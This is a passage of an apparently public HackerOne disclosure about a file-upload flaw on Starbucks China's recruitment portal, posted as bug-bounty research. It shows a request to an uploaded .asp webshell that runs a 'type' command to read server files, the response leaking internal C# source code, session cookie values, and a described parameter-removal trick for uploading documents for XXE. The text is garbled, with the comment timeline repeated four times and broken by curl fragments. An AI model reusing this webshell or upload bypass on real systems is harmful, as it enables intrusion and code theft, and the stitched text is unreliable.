- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
Upgrade-Insecure-Requests: 1' \
    -b 

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' \
    

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=type%20d:\\TrustHX\\STBKSERM101\\www_app\\concurrent_test\\new_application_concurrent_test__svc.cs'
```
the source code respones:
```
HTTP/1.1 200 OK
Date: Fri, 08 Mar 2019 03:37:39 GMT
Server: wswaf/2.13.0-5.el6
Content-Type: text/html
Cache-Control: private
X-Powered-By: ASP.NET
X-Via: 1.1 jszjsx51:0 (Cdn Cache Server V2.0), 1.1 ydx154:3 (Cdn Cache Server V2.0)
Connection: close
Content-Length: 33316

<html>
<body>
<h1>POC by hackerone_john stone</h1>
<textarea readonly cols=80 rows=25>
ï»¿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System;
using System.Collections.Specialized;
using System.Collections.Generic;
using System.Data;
using System.Configuration;
using System.Xml;
using System.Transactions;
using System.Text;
using System.Threading;
using System.Web;

using TrustHX.IHXEIMS6;
using hxsys = TrustHX.HXEIMS6;
using hxwww = TrustHX.HXWWW6;
using hxsm = TrustHX.HXSM6;
using hxmd = TrustHX.HXMD6;


class new_application_concurrent_test : IHXPageXmlService
{
    #region IHXPageXmlService æå
    string IHXPageXmlService.Run(string strSystemCode, string strPageXmlServiceCode, string strPageXmlServiceContent, string strHXPageParamUUID, string strHXPageName)
    {
        try
        {
            switch (strPageXmlServiceCode)
            {
                case "PREPARE_CONCURRENT_DATA":return ConcurrentDataPrepare.ConcurrentDataPrepareProcess(strSystemCode, strPageXmlServiceContent);
                case "CONCURRENT_TEST":return ConcurrentTest.ConcurrentTestProcess(strSystemCode, strPageXmlServiceContent);
                default:
                    string strErrorMessageText =
....................................
</textarea>
</body>
</html>
```

## Recommendations for fix

*Strictly limit file upload types
*Only allow jpg/png/gif/jpeg file parsing on the uploaded fiels
*More safe code design

Thks!Looking forward to your reply.
With kind regards
John stone

## Impact

disclosures  the internal source code data and user's information,broken ring server,etc.

## Timeline

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
